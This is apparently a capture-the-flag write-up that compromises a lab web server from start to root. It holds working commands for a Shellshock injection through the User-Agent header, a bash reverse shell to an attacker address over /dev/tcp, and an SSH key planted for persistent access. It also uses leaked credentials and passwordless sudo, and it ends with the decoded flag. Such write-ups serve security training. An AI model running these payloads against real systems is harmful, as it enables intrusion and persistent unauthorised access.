# Web Hacking 05
```bash
IP=192.168.10.8
PORT=8110
AUTH=admin:PmFKFzNUzlITtN5mEVr1n9mEx0COWRjc
```
## Portscan
```bash
$ nmap -p- $IP

Nmap scan report for 192.168.10.8
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8110/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 46.49 seconds
```

```bash
$ curl -I http://$IP:$PORT
HTTP/1.1 401 Unauthorized
Date: Mon, 06 Jun 2022 19:43:42 GMT
Content-Type: text/html
Content-Length: 172
Connection: keep-alive
WWW-Authenticate: Basic realm="Registry realm"
Server: admin : PmFKFzNUzlITtN5mEVr1n9mEx0COWRjc

```

Open `http://$IP:$PORT` in browser and try login as `$AUTH`, success.

`curl http://$IP:$PORT -u $AUTH`

Website shows image of "shellshock"

## SSH
try connect to `admin@$IP` with password, no success.

## Gobuster
```bash
$ gobuster dir -u http://$IP:$PORT -w /usr/share/wordlists/dirb/common.txt -U admin -P PmFKFzNUzlITtN5mEVr1n9mEx0COWRjc
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.8:8110
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Auth User:               admin
[+] Timeout:                 10s
===============================================================
2022/06/06 22:11:05 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 286]
/.htaccess            (Status: 403) [Size: 286]
/cgi-bin/             (Status: 403) [Size: 285]
/index.html           (Status: 200) [Size: 279]
/index                (Status: 200) [Size: 279]
/robots               (Status: 200) [Size: 202]
/robots.txt           (Status: 200) [Size: 202]
/server-status        (Status: 403) [Size: 290]
                                               
===============================================================
2022/06/06 22:12:20 Finished
===============================================================
```

Open robots.txt
```bash
$ curl http://$IP:$PORT/robots.txt -u $AUTH                    

/cgi-bin/vulnerable

This machine appears to be vulnerable to Shellshock, try to obtain a reverse shell.
```

```bash
$ curl -A "() { :;}; echo; /bin/bash -c 'id'" http://$IP:$PORT/cgi-bin/vulnerable -u $AUTH
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

reverse shell with `nc -lvp 1337` and `curl -A "() { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.9.2/1337 0>&1'" http://$IP:$PORT/cgi-bin/vulnerable -u $AUTH`.

the home folder has a `touchmenot.sh`, when executed, the user is changed to joaquim.

```bash
$ cd /home/joaquim
$ id
uid=33(www-data) gid=33(www-data) euid=1000(joaquim) egid=1000(joaquim) groups=1000(joaquim),33(www-data)

$ cat ssh_config.txt
SSH server is running on a deprecated version.

In order to establish an ssh connection, we need to use ED25519 algorithm.

Create a key with the following command and then paste it on the .ssh/authorized_keys file.

ssh-keygen -t ed25519 -C "your_email@example.com"

To access the server, execute the following command:

ssh -i key user@ip
```

on attacker machine the key ist created
```bash
$ ssh-keygen -t ed25519 -C "your_email@example.com"
$ cat key.pub ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJe+bjgEz9hKqWcFT6bX8bfppr1aTM5zC46oQ/M9Yzd9 your_email@example.com
```

through reverse shell
```bash
$ cd .ssh
$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJe+bjgEz9hKqWcFT6bX8bfppr1aTM5zC46oQ/M9Yzd9 your_email@example.com" >> authorized_keys
$ cat authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSZDrYvsA+71Dsj52F8d5/qBsURESHx8e++XPigszh test@example.com
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJe+bjgEz9hKqWcFT6bX8bfppr1aTM5zC46oQ/M9Yzd9 your_email@example.com
```

now connection can be established using `ssh -i key joaquim@$IP`

the user is in sudo group and wont require a password. so now look for the key.

```bash
$ sudo ls -lah /root
total 20K
drwx------ 1 root root 4.0K May 21 11:21 .
drwxr-xr-x 1 root root 4.0K Jun  6 07:15 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  140 Nov 19  2007 .profile
-rw-rw-r-- 1 root root   28 May 21 11:14 flag.zip

$ sudo file /root/flag.zip
/root/flag.zip: ASCII text, with no line terminators

$ sudo cat /root/flag.zip 
Y3liZXJjdGZkezFfNG1fcjAwN30=

$ sudo cat /root/flag.zip | base64 -d
cyberctfd{1_4m_r007}
```

`cyberctfd{1_4m_r007}`